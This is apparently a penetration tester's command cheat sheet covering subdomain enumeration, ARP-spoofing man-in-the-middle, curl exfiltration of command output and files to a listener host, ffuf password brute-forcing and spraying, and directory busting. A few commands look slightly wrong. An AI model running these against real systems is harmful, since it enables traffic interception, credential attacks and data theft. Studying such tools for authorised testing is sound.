# Commands

---

## amass

Amass is a tool which helps us perform external asset discovery using open source information gathering and active reconnaissance techniques.

This package contains several wordlists for performing DNS name alterations and brute forcing.

### enum

Amass uses different *subcommands*. Here are some ways we can use the *enum* subcommand.

`sudo amass enum -d elsfoo.com` | the -d flag is to specify the domain

`sudo amass enum -passive -d elsfoo.com` | the -passive flag specifies only run passive techniques

`sudo amass enum -d elsfoo.com -src -ip -dir ./amass_1` | the -src flag gives us the source of the data | the -ip flag gives us the IP address of the subdomain | the -dir flag lets us specify the directory to save the scan results

`sudo amass enum -d elsfoo.com -src -ip -brute -dir ./amass_brute` | the -brute flag launches a brute-force attack of sub-domains

### viz

Another *subcommand* is the *viz* subcommand which lets us generate different types of report to visualize the amass scans.

`sudo amass viz -dir ./amass_1 -d3` | the -d3 flag specifies a d3 report which uses html

---

## arp spoof

Before we run a *man in the middle* attack, we need to configure our machine so traffic can be forwarded.

`echo 1 > /proc/sys/net/ipv4/ip_forward` | configures the machine to forward traffic

We can now spoof the machines we are targetting. One of these machines will be the gateway.

`sudo arpspoof -i eth0 -t 172.16.5.30 172.16.5.1`

`sudo arpspoof -i eth0 -t 172.16.5.1 172.16.5.30`

---

## curl

We can use *curl* to establish a connection to a remote machine. We will need to use a *netcat* listener on the machine we are connecting to.

`sudo curl http://192.168.56.101:53`

We can send the results of system commands which do not includ blank spaces in their results.

`sudo curl http://192.168.56.101:53/whoami`

If there will be reserved characters in the result, we can *base64* encode the data before sending it.

`sudo curl http://192.168.56.101:53/id|base64`

We can then decode the data.

`echo djKK81jsDT== | base64 -d` | the -d flag specifies decode

We can use *curl* to transfer files using the -T flag.

`sudo curl http://192.168.56.101:53/interesting_file.txt -T /tmp`

---

## ffuf

*ffuf* is used for directory busting, dns subdomain finding and various activities related to dictionary attacks | it is fast.

Default mode to perform **directory busting** | we can use the `-fs 3121` flag to filter out responses based on their **size** | here we are specifying that we do not want to see responses which have a size of **3121** as we have ascertained that they are non-existent resources.

`sudo ffuf -u https://example.com/FUZZ -w /usr/share/dirb/wordlists/common.txt -fs 3121`

We can filter by **matching** responses we want to see using the `-mc` flag.

`sudo ffuf -u https://example.com/FUZZ -w /usr/share/dirb/wordlists/common.txt -mc 200,301,302`

We can **filter out** responses we do not want to see based on their **response code** using the `-fc 404` flag.

`sudo ffuf -u https://example.com/FUZZ -w /usr/share/dirb/wordlists/common.txt -fc 404`

Default mode to run a dictionary attack against a username | the flag `-mc 302` matches **302** redirects maybe useful for valid logins.

`username=admin&password=FUZZ`

`sudo ffuf -request req3.txt -request-proto https -w /opt/SecLists/Passwords/Leaked-Databases/rockyou-75.txt:FUZZ -mc 302`

Password spray emulation using `-mode clusterbomb` | prepare a list of usernames and a password list with 1 or maybe up to 3 passwords in.

`username=FUZZUSER&password=FUZZPASS`

`sudo ffuf -request req3.txt -request-proto https -mode clusterbomb -w user.txt:FUZZUSER -w pass.txt:FUZZPASS -mc 302`

Using a `-mode pitchfork` attack so each username is tried with its corresponding password across a user list and password list. The `-rate 1` flag limits the requests to **1 per second** so the usernames and passwords get sent together in the correct order. The `-o` flag lets us specify how to output the results.

`sudo ffuf -request req3.txt -rate 1 -request-proto https -mode pitchfork -w users.txt:FUZZUSER -w passwords.txt:FUZZPASS -mc 302 -o results.txt`

We can use **ffuf** with **json** post request data.

`{"email":"FUZZUSER","password":"FUZZPASS"}`

---

## gobuster

*gobuster* is great for **directory busting** and it can also **fuzz vhosts**

Basic command for **directory busting**.

`sudo gobuster dir -u https://example.com -w /usr/share/dirb/wordlists/common.txt`

It can search for **file extensions** using the `-x` flag.

`sudo gobuster dir -u https://example.com -w /usr/share/dirb/wordlists/common.txt -x bak,old,txt,sh,php`

If we have valid creds and want to search behind **password protected areas** we can use.

`sudo gobuster dir -u https://example.com/project -U admin -P mickeymouse123 -w /usr/share/dirb/wordlists/common.txt -x config,php`

To **fuzz vhosts** we can use.

`sudo gobuster vhost -u https://example.com -w /usr/share/amass/wordlists/subdomains-top1mil-20000.txt`

---

## tape archive

*tar* is used to archive files and directories. It does not have to be compressed but it can be.

Archive files are simply a collection of files which have been archived into one file - they can be unarchived back into their original form.

`sudo tar -cvf file.tar *` | the -c flag creates an archive | the -v flag is for verbose output | the -f flag lets us specify the archive filename | the * wildcard specifies all the files in a directory

`sudo tar -xvf file.tar` | the -x flag specifies extract all the files to their original form

`sudo tar -zcvf file.tar` | the -z flag specifies compress the archive file using *gzip*

`sudo tar -zxvf file.tar` | this command decompresses and extracts the compressed and archived files

---
